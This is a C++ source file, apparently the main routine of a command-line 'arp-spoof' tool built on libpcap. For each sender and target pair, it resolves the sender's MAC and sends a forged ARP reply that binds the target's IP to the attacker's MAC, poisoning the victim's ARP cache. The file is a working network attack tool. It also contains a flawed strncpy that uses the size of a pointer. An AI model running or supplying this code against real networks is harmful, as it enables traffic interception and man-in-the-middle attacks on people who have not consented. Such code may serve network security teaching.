#include <cstdio>
#include <iostream>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include "attack.h"

void usage() {
	printf("syntax : arp-spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
	printf("sample : arp-spoof enp0s3 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n");
}

int main(int argc, char* argv[]) {
	if (argc < 4 || argc % 2 != 0) {
		usage();
		return -1;
	}

	int count = (argc - 1) / 2;

	for (int i = 0; i < count; i++) {
		char dev[10];
		strncpy(dev, argv[1], sizeof(argv[1]));

		Ip sender_ip = Ip(argv[2 * (i + 1)]);
		Ip target_ip = Ip(argv[2 * (i + 1) + 1]);

		Mac source_mac = get_source_mac(dev);
		Ip source_ip = get_source_ip(dev);


		char errbuf[PCAP_ERRBUF_SIZE];
		pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
		if (handle == nullptr) {
			fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
			return -1;
		}

		Mac sender_mac = get_mac_adress(handle, Mac("ff:ff:ff:ff:ff:ff"), source_mac,
																		htons(ArpHdr::Request), source_mac, htonl(source_ip),
																		Mac("00:00:00:00:00:00"), htonl(sender_ip));

		EthArpPacket attack_packet = config_packet(sender_mac, source_mac, htons(ArpHdr::Reply),
																								source_mac, htonl(target_ip),
																								sender_mac, htonl(sender_ip));

		int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&attack_packet), sizeof(EthArpPacket));
		if (res != 0) {
			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
		}

		pcap_close(handle);
	}
}
